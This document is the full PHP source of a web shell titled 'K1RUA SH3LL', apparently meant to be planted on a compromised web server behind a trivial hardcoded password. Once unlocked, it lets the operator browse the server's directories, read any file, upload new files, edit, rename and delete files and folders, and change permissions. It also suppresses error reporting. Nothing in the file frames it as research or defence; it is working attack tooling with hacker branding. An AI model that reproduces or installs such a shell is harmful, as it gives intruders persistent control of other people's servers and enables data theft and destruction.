<?php
$pass = "4";
session_start();
?>
<!DOCTYPE HTML>
<html><head>
<title>Kirua SH3LL</title>
 
<meta property="og:image" content="https://media.giphy.com/media/3rX2Tco5sDmEg/giphy.gif">
<link href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAC+AAAAvgAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAABwAAAAAAAAAAAAAABwAAAP8AAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACSAAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAACSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPcAAAD/AAAA/wAAAPcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//8AAP//AACAAQAAwYMAAMPDAADjxwAA5+cAAPfvAAD4HwAA+B8AAPw/AAD8PwAA/n8AAP//AAD//wAA//8AAA==" rel="icon" type="image/x-icon">
<style>
body{font-family: "Orbitron", cursive;background-color: black;}
input[type=password]{border: 2px solid #00b2ee;border-radius: 4px;background-color: black;color: white;}
input::-webkit-input-placeholder{color:red;}
textarea:-moz-placeholder{color:#00b2ee;}
</style>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
</head><body>
<?php
if (!empty($_GET['action']) &&  $_GET['action'] == "logout") {session_destroy();unset ($_SESSION['pass']);}
 
$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}
if (empty($_POST['pass'])) {$_POST['pass']='';}
if ( $_SESSION['pass']!== $pass)
{
    if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass; }
    else
    {
        echo '
       <audio id="song" source="mp3" src="https://d.top4top.net/m_680d2y7k1.mp3" type="audio/mp3" autoplay="autoplay" loop="loop"></audio>
       <script>
       var snd = document.getElementById("song");
       snd.volume = 0.3;
       </script>
       <center>
       <img src="https://media.giphy.com/media/3rX2Tco5sDmEg/giphy.gif"/>
       <br>
       <a href="https://twitter.com/KiruaBMO" class="twitter-follow-button" data-show-count="false" data-size="large" color="#ff000" style="font-family:Iceberg;">Follow @KiruaBMO</a>
   <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 
       <div style="font-color:white;"><form action="'.$_SERVER['PHP_SELF'].'" method="post"><input name="pass" placeholder="Mot de Passe (Twitter : @KiruaBMO)" style="text-align:center;
width:350px;height:30px;font-size:20px;" type="password"></form></div>
       </center>';
        exit;}}
?>
<?php
error_reporting(0);
set_time_limit(0);
 
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>K1RUA SH3LL</title>
<link href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAC+AAAAvgAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAABwAAAAAAAAAAAAAABwAAAP8AAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACSAAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAACSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPcAAAD/AAAA/wAAAPcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//8AAP//AACAAQAAwYMAAMPDAADjxwAA5+cAAPfvAAD4HwAA+B8AAPw/AAD8PwAA/n8AAP//AAD//wAA//8AAA==" rel="icon" type="image/x-icon"><title>cked / Ha</title>
<meta name="keywords" content="Shell By Kirua">
<meta name="description" content="Shell By Kirua">
<meta name="author" content="Kirua">
<link href="https://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet">
<style>
body{
font-family: "Orbitron", cursive;
background-color: black;
color:white;
}
#content tr:hover{
background-color: purple;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: purple;
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:red;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 0px #00FFFF solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
<h1><center><font color="red" face="Orbitron">K1RUA SH3LL</font></center></h1>
<center><img src="https://media.giphy.com/media/3rX2Tco5sDmEg/giphy.gif"><center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<embed
src="https://www.youtube.com/v/8UbS2pKIyOQ&amp;autoplay=1&amp;loop=1&amp;playlist=942K5bNiTfY"
type="application/x-shockwave-flash" wmode="transparent" height="1"
width="1"></embed>  
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
 
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#00FF00">Upload Done</font><br />';
}else{
echo '<font color="purple">Upload Failed</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#00FF00">Change Permission Done</font><br/>';
}else{
echo '<font color="purple">Change Permission Failed</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#00FF00">Rename Done</font><br/>';
}else{
echo '<font color="purple">Rename Failed</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#00FF00">Done Edit File</font><br/>';
}else{
echo '<font color="purple">Fail Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#00FF00">Directory Deleted</font><br/>';
}else{
echo '<font color="purple">Directory Fail Delete                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#00FF00">File Deleted</font><br/>';
}else{
echo '<font color="purple">File Fail Delete</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';
 
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="#00FF00">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="purple">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
 
echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="#00FF00">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="purple">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/></center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
 
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
 
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
 
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
 
return $info;
}
?>
